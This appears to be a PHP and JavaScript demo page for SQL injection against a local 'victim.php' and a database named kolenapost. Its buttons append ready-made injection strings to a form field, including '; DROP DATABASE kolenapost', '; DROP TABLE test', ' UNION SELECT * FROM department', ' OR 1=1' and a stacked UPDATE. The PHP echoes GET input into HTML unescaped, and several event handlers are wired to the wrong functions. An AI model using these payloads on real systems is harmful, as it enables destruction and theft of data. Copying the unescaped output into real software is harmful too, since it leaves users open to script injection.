<?php
    function makeTxtForms($global_arr)
    {
        $text_form = '<form>';
        $table_name = key($_GET);
        echo "<h3>{$table_name} table</h3>";
        $text_str = "<input type='text' class='form-control' name='text_list[]' id='main_table";
        $label_start = "<label>";
        $label_end = "</label></br>";

        for($i=0;$i<sizeof($global_arr);$i++){
            $temp = (string)$global_arr[$i];
    
            $text_form = $text_form.$text_str.$i."' required/>";
            $text_form = $text_form.$label_start.$temp.$label_end;
        }
        $text_form = $text_form.'</form>';
        print($text_form);
    }
    
    
    $table_name = key($_GET);
    $table_param=$_GET["{$table_name}"];    
    
    (makeTxtForms($table_param));
?>

<script type="text/javascript">

var ajax;
InitAjax();
function InitAjax() 
{
	try 
	{ /* пробуем создать компонент XMLHTTP для IE старых версий */
	ajax = new ActiveXObject("Microsoft.XMLHTTP");
	} 
		catch (e) 
		{
		try 
			{//XMLHTTP для IE версий >6
			ajax = new ActiveXObject("Msxml2.XMLHTTP");
			} 
			catch (e) 
			{
			    try 
				{// XMLHTTP для Mozilla и остальных
				ajax = new XMLHttpRequest();
				} 
				catch(e) 
				{ ajax = 0; }
			}
		}
}

function sendAjaxGetRequest(request_string,response_handler)
{
	if (!ajax) 
	{
		alert("Ajax не инициализирован");
		return;
	}
	ajax.onreadystatechange = response_handler;
	ajax.open( "GET", request_string, true );
	ajax.send(null);
}


function addUpdate()
{
    var last_form = <?php echo json_encode(sizeof($table_param)) ?> - 1;
    var update = document.getElementById('main_table'+last_form.toString());
    var str = ' ; UPDATE package SET cost=123 WHERE recipient>1 '
    update.value += str;
}

document.getElementById("button0").onclick = addUpdate;

function addUnion()
{
    var last_form = <?php echo json_encode(sizeof($table_param)) ?> - 1;
    var union = document.getElementById('main_table'+last_form.toString());
    union.value += ' UNION SELECT * FROM department';
}

document.getElementById("button4").onclick = addUnion;

function addOR()
{
    var last_form = <?php echo json_encode(sizeof($table_param)) ?> - 1;
    var or = document.getElementById('main_table'+last_form.toString());
    or.value += ' OR 1=1 ';
}
document.getElementById("button6").onclick = addUnion;


function addDropDB()
{
    var last_form = <?php echo json_encode(sizeof($table_param)) ?> - 1;
    var drop_db = document.getElementById('main_table'+last_form.toString());
    drop_db.value += ' ; DROP DATABASE kolenapost';
}

document.getElementById("button1").onclick = addDropDB;

function addDropTB()
{
    var last_form = <?php echo json_encode(sizeof($table_param)) ?> - 1;
    var drop_tb = document.getElementById('main_table'+last_form.toString());
    drop_tb.value += ' ; DROP TABLE test';
}

document.getElementById("button2").onclick = addDropTB;

function addSelect()
{
    var last_form = <?php echo json_encode(sizeof($table_param)) ?> - 1;
    var select = document.getElementById('main_table'+last_form.toString());
    select.value += ' ; SELECT * FROM worker';
}

document.getElementById("button3").onclick = addSelect;
function refreshForm()
{
    var last_form = <?php echo json_encode(sizeof($table_param)) ?> - 1;
    var refresh = document.getElementById('main_table'+last_form.toString());
    refresh.value = '';
}

document.getElementById("button4").onclick = refreshForm;

function firstStep()
{   
    var arr_size = <?php echo json_encode(sizeof($table_param)) ?>;
    var table_name = <?php echo json_encode($table_name) ?>;
    var table_param = <?php echo json_encode($table_param)?>;
    
    var result_arr = new Object();
    result_arr['table_name'] = table_name;
    var is_empty = 1;

    for(var i=0;i<arr_size;i++){
        var form_value = document.getElementById("main_table"+i.toString()).value;
        if(form_value){
            is_empty *= 1;
        }
        else{
            is_empty *= 0;
        }
        result_arr[table_param[i]] = form_value;
    }
    if(is_empty){
        var ret = JSON.stringify(result_arr);
        var params = 'result=' + encodeURIComponent(ret);
        sendAjaxGetRequest("output_first_step.php?"+params, onFirstStepResponse);
    }
    else{
        alert("All fields must be fields");
    }
    
}
    document.getElementById("submit").onclick = firstStep;

function removeId(id)
{
    var Element = document.getElementById(id);

    if(Element)
        {Element.parentNode.removeChild(Element);}
}

function cleanTable()
{
    removeId("main_table");
    removeId("alert");
    removeId("pdo_alert");
    removeId("table_data");
    removeId("table_data2");
    removeId("drop");
    removeId("universal_table");
    removeId("select");
    removeId("show");
    removeId("update");
}

    document.getElementById("submit").onclick = cleanTable;


function onFirstStepResponse()
{
    if (ajax.readyState == 4) 
	{
		if (ajax.status == 200) 
		{
			var d1 = document.getElementById('submit'); 
            // alert(d1.value);
			d1.insertAdjacentHTML('afterend', ajax.responseText);
		}
		else alert(ajax.status + " - " + ajax.statusText);
		ajax.abort();
	}
}



function insert_update()
{
    referenceNode.parentNode.insertBefore('select', 'universal_table'.nextSibling);
}


</script>

<style>
.wrapper {
  width: 15%;
  min-height: 50px;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  float: right;
  justify-content: space-around;
}

.one {
  min-height: 50px;
  flex: 2;
  flex-direction: column;
  float: right;
}

.two {
  min-height: 50px;
  flex: 1;
}
</style>

<input type="button" value="UPDATE" class="wrapper" id="button0" onclick="addUpdate();" />​
<input type="button" value="DROP_DB" class="one" id="button1" onclick="addDropDB();" />​
<input type="button" value="DROP_TABLE" class="one" id="button2" onclick="addDropTB();" />​
<input type="button" value="SELECT" class="one" id="button3" onclick="addSelect();" />​
<input type="button" value="UNION" class="one" id="button4" onclick="addUnion();" />​
<input type="button" value="REFRESH_FORM" class="one" id="button5" onclick="refreshForm();" />​
<input type="button" value="OR" class="one" id="button6" onclick="addOR();" />​


<button onclick="history.go(0);">Refresh Page</button>


<form method='get' action='victim.php'>
<input id="submit" type="button" value="Submit Params" onclick="firstStep();cleanTable();" />
</form>


